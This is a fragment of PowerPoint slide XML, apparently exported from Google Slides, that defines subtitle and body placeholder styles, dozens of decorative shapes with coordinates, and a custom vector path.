          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4281180" y="3818903"/>
            <a:ext cx="7068800" cy="1046400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="t" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr lvl="0" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="2600"/>
              <a:buNone/>
              <a:defRPr>
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr lvl="1" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr lvl="2" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr lvl="3" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr lvl="4" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr lvl="5" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr lvl="6" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr lvl="7" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr lvl="8" algn="r" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:srgbClr val="1C4587"/>
              </a:buClr>
              <a:buSzPts val="3000"/>
              <a:buNone/>
              <a:defRPr sz="4000">
                <a:solidFill>
                  <a:srgbClr val="1C4587"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="195" name="Google Shape;195;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5882774" y="6215517"/>
            <a:ext cx="600733" cy="744979"/>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6" name="Google Shape;196;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5291768" y="5333718"/>
            <a:ext cx="591013" cy="672893"/>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7" name="Google Shape;197;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8377819" y="5612687"/>
            <a:ext cx="280284" cy="611852"/>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8" name="Google Shape;198;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7662081" y="5390448"/>
            <a:ext cx="552209" cy="677016"/>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199" name="Google Shape;199;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9418147" y="5509371"/>
            <a:ext cx="609091" cy="567451"/>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0" name="Google Shape;200;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11657298" y="5555569"/>
            <a:ext cx="660375" cy="453651"/>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1" name="Google Shape;201;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8775356" y="5388321"/>
            <a:ext cx="496691" cy="513331"/>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2" name="Google Shape;202;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8676176" y="6045283"/>
            <a:ext cx="695056" cy="718656"/>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3" name="Google Shape;203;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7334739" y="6076801"/>
            <a:ext cx="672893" cy="534169"/>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4" name="Google Shape;204;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6935423" y="5434132"/>
            <a:ext cx="627093" cy="58961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5" name="Google Shape;205;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6354112" y="5434125"/>
            <a:ext cx="452803" cy="534156"/>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6" name="Google Shape;206;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7362478" y="6664025"/>
            <a:ext cx="617412" cy="237283"/>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7" name="Google Shape;207;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10736763" y="6433681"/>
            <a:ext cx="786656" cy="552172"/>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8" name="Google Shape;208;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10736769" y="5372369"/>
            <a:ext cx="517491" cy="545251"/>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09" name="Google Shape;209;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9312764" y="6600511"/>
            <a:ext cx="396808" cy="28164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0" name="Google Shape;210;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11666301" y="6600167"/>
            <a:ext cx="384327" cy="245603"/>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1" name="Google Shape;211;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8214287" y="6373645"/>
            <a:ext cx="431488" cy="428728"/>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2" name="Google Shape;212;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11363259" y="5333706"/>
            <a:ext cx="409288" cy="513369"/>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3" name="Google Shape;213;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6522965" y="6070569"/>
            <a:ext cx="554971" cy="546651"/>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4" name="Google Shape;214;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11772537" y="6111825"/>
            <a:ext cx="521651" cy="385727"/>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5" name="Google Shape;215;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5985573" y="5608925"/>
            <a:ext cx="240044" cy="498052"/>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6" name="Google Shape;216;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1920548">
            <a:off x="9648968" y="6210900"/>
            <a:ext cx="668696" cy="567409"/>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7" name="Google Shape;217;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="11017723" y="6023741"/>
            <a:ext cx="639575" cy="452289"/>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8" name="Google Shape;218;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-5400000">
            <a:off x="10245807" y="5309640"/>
            <a:ext cx="373208" cy="477288"/>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19" name="Google Shape;219;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10212864" y="5826928"/>
            <a:ext cx="503611" cy="568851"/>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0" name="Google Shape;220;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6746084" y="6610610"/>
            <a:ext cx="514731" cy="3440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1" name="Google Shape;221;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="10376560" y="6513509"/>
            <a:ext cx="233123" cy="249763"/>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2" name="Google Shape;222;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1977021" y="5612687"/>
            <a:ext cx="280284" cy="611852"/>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3" name="Google Shape;223;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1261281" y="5390448"/>
            <a:ext cx="552209" cy="677016"/>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4" name="Google Shape;224;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3017347" y="5509371"/>
            <a:ext cx="609091" cy="567451"/>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5" name="Google Shape;225;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2374556" y="5388321"/>
            <a:ext cx="496691" cy="513331"/>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6" name="Google Shape;226;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2275376" y="6045283"/>
            <a:ext cx="695056" cy="718656"/>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7" name="Google Shape;227;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="933939" y="6076801"/>
            <a:ext cx="672893" cy="534169"/>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8" name="Google Shape;228;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="534623" y="5434132"/>
            <a:ext cx="627093" cy="589613"/>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29" name="Google Shape;229;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-46688" y="5434125"/>
            <a:ext cx="452803" cy="534156"/>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0" name="Google Shape;230;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="961678" y="6664025"/>
            <a:ext cx="617412" cy="237283"/>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1" name="Google Shape;231;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4335963" y="6433681"/>
            <a:ext cx="786656" cy="552172"/>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2" name="Google Shape;232;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4335971" y="5372369"/>
            <a:ext cx="517491" cy="545251"/>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3" name="Google Shape;233;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2911965" y="6600511"/>
            <a:ext cx="396808" cy="28164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4" name="Google Shape;234;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5265501" y="6600167"/>
            <a:ext cx="384327" cy="245603"/>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5" name="Google Shape;235;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1813487" y="6373645"/>
            <a:ext cx="431488" cy="428728"/>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6" name="Google Shape;236;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4962459" y="5333706"/>
            <a:ext cx="409288" cy="513369"/>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7" name="Google Shape;237;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="122165" y="6070569"/>
            <a:ext cx="554971" cy="546651"/>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8" name="Google Shape;238;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5371737" y="6111825"/>
            <a:ext cx="521651" cy="385727"/>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39" name="Google Shape;239;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3606" y="6533642"/>
            <a:ext cx="240044" cy="498052"/>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0" name="Google Shape;240;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="1920548">
            <a:off x="3248167" y="6210900"/>
            <a:ext cx="668696" cy="567409"/>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1" name="Google Shape;241;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4616923" y="6023741"/>
            <a:ext cx="639575" cy="452289"/>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2" name="Google Shape;242;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm rot="-5400000">
            <a:off x="3845007" y="5309640"/>
            <a:ext cx="373208" cy="477288"/>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3C78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3" name="Google Shape;243;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3812064" y="5826928"/>
            <a:ext cx="503611" cy="568851"/>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4" name="Google Shape;244;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="345284" y="6610610"/>
            <a:ext cx="514731" cy="344087"/>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
        <p:nvSpPr>
          <p:cNvPr id="245" name="Google Shape;245;p3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3975760" y="6513509"/>
            <a:ext cx="233123" cy="249763"/>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6D9EEB"/>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A4C2F4"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2252348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290"/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="291" name="Google Shape;291;p5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="997233" y="300033"/>
            <a:ext cx="8187200" cy="1143200"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="b" anchorCtr="0"/>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292" name="Google Shape;292;p5"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="997233" y="1737116"/>
            <a:ext cx="8187200" cy="4814400"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr spcFirstLastPara="1" wrap="square" lIns="91425" tIns="91425" rIns="91425" bIns="91425" anchor="t" anchorCtr="0"/>
          <a:lstStyle>
            <a:lvl1pPr marL="609585" lvl="0" indent="-516454">
              <a:spcBef>
                <a:spcPts val="800"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2500"/>
              <a:buChar char="✘"/>
              <a:defRPr sz="3333"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="1219170" lvl="1" indent="-474121">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="2000"/>
              <a:buChar char="✗"/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1828754" lvl="2" indent="-474121">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="20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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="293" name="Google Shape;293;p5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="9923870" y="-121539"/>
            <a:ext cx="2395052" cy="7107432"/>
            <a:chOff x="6023725" y="842300"/>
            <a:chExt cx="1358150" cy="4030375"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="294" name="Google Shape;294;p5"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="6371275" y="842300"/>
              <a:ext cx="397100" cy="492450"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="15884" h="19698" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="9355" y="4108"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9465" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="4182"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="4328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4769"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9685" y="4879"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4695"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="4438"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="4328"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="4108"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9355" y="3705"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9245" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9135" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="3925"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4218"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8878" y="4952"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8988" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9098" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9245" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="5355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="5355"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="5245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="5135"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="4989"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="4805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10125" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10088" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="4145"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9905" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="3888"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="3778"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="3742"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9355" y="3705"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11262" y="6676"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="11262" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="6859"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10602" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9795" y="7556"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9721" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10639" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11079" y="6676"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11115" y="6273"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10859" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10052" y="6639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9318" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9465" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="7813"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9575" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10492" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10859" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11592" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11556" y="6419"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="6346"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11372" y="6273"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10198" y="2861"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10235" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="3595"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10565" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9025" y="6052"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7154" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="7997"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3816" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3486" y="8290"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3266" y="7887"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3045" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2679" y="6566"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2532" y="6162"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2385" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2238" y="5612"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3192" y="5429"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3669" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="5099"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5210" y="4659"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6273" y="4218"/>
